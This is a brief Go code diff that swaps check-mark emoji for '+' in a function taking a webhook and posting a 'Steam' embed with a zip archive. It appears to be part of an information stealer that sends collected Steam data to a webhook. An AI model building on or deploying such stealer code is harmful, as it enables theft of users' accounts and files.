@@ -69,7 +69,7 @@ func Run(webhook string) {
 				}
 
 				if !strings.Contains(found, name) {
-					found += fmt.Sprintf("\n✅ %s ", name)
+					found += fmt.Sprintf("\n+ %s ", name)
 				}
 			}
 
@@ -122,7 +122,7 @@ func Run(webhook string) {
 		"embeds": []map[string]interface{}{
 			{
 				"title":       "Steam",
-				"description": "`✅✅✅`",
+				"description": "+",
 			},
 		},
 	}, tempZip)
